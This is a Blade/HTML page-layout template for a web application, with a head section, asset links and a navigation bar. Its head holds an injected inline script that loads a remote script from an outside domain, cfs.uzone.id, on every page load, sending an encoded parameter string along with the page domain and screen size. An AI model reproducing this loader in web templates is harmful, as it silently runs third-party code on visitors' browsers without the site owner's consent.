<!DOCTYPE html>
<html class="bootstrap-layout">


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>{{ Setting::attribute('application_name') }}</title>

  <!-- Prevent the demo from appearing in search engines (REMOVE THIS) -->
  <meta name="robots" content="noindex">

  <!-- Material Design Icons  -->
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

  <!-- Roboto Web Font -->
  <link href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en" rel="stylesheet">

  <!-- App CSS -->
  <link type="text/css" href="{{ asset(null) }}assets/css/style.min.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.css">

  <!-- jQuery -->
  <script src="{{ asset(null) }}assets/vendor/jquery.min.js"></script>
  
  <!-- Bootstrap -->
  <script src="{{ asset(null) }}assets/vendor/tether.min.js"></script>
  <script src="{{ asset(null) }}assets/vendor/bootstrap.min.js"></script>

  <!-- AdminPlus -->
  <script src="{{ asset(null) }}assets/vendor/adminplus.js"></script>

  <!-- App JS -->
  <script src="{{ asset(null) }}assets/js/main.min.js"></script>

  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnSiH1OCC135SK4Fiek9bwmnJiocujcaOCrKXjBbS7aQAImda%2fywTr2hsoUs3QfvEl%2baVzY8jH6%2fUIrU2x7jU3cDQ3Xwys5yGlW4DYDTHnP3Jpzr3iswG9e9FUBq19jZBJC7J125NYUHLK%2b8Wh4bCEvot7afrDQMeGR2H4JYwalo5qI3m0omZKBPsHKcCMwBhhbU41A6R1P6nol1P9U4rqEMIx%2bsdpn4lSKqdLnvSpi49cuIkdXyGYfjr5q%2bl1n5Lt1RSVFAP%2b7qfYiLIPB93GrQa86cpiYVJfgyT1oCwpU%2brAZgf%2bPUY2pcnHOCe4F1RzAIU8f75c8vIxTYi%2fht6naf%2fL6Dan1JBp52gzmUhcJ3laETO4N4uZ9bYgIMRrT9MqFF8mh%2feMX2i2m8Jc2A263pgcUaUu8tnXy3zZPP4ys%2f3KPV%2fm%2f27fwCrRa8hiV5C14050A53hSpo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert-dev.min.js"></script>
  
  
</head>

<body class="layout-container ls-top-navbar si-l3-md-up">

  <!-- Navbar -->
  <nav class="navbar navbar-dark bg-primary navbar-full navbar-fixed-top">

    <!-- Toggle sidebar -->
    <button class="navbar-toggler pull-xs-left" type="button" data-toggle="sidebar" data-target="#sidebarLeft"><span class="material-icons">menu</span></button>

    <!-- Brand -->
    <a href="index-2.html" class="navbar-brand"><!--i class="material-icons">school</i-->{{ Setting::attribute('application_name') }}</a>

    <!-- Search -->
    <form class="form-inline pull-xs-left hidden-sm-down">
      <div class="input-group">
        <input type="text" class="form-control" placeholder="Search">
        <span class="input-group-btn"><button class="btn" type="button"><i class="material-icons">search</i></button></span>
      </div>
    </form>
    <!-- // END Search -->

    <ul class="nav navbar-nav hidden-sm-down">

      <!-- Menu -->
      <li class="nav-item">
        <a class="nav-link" href="forum.html">Forum</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="get-help.html">Get Help</a>
      </li>
    </ul>

    <!-- Menu -->
    <ul class="nav navbar-nav pull-xs-right">

      <li class="nav-item">
        <a href="cart.html" class="nav-link">
          <i class="material-icons">shopping_cart</i>
        </a>
      </li>

      <!-- User dropdown -->
      <li class="nav-item dropdown">
        <a class="nav-link active dropdown-toggle p-a-0" data-toggle="dropdown" href="#" role="button" aria-haspopup="false">
        @if(!empty(user()->image))  
          <img src="{{ asset('contents/thumbnails/'.user()->image) }}" alt="Avatar" class="img-circle" width="40">
        @endif
        </a>
        <div class="dropdown-menu dropdown-menu-right dropdown-menu-list" aria-labelledby="Preview">
          <a class="dropdown-item" href="account-edit.html"><i class="material-icons md-18">lock</i> <span class="icon-text">Edit Account</span></a>
          <a class="dropdown-item" href="profile.html"><i class="material-icons md-18">person</i> <span class="icon-text">Public Profile</span></a>
          <a class="dropdown-item" href="{{ url('auth/logout') }}">Logout</a>
        </div>
      </li>
      <!-- // END User dropdown -->

    </ul>
    <!-- // END Menu -->

  </nav>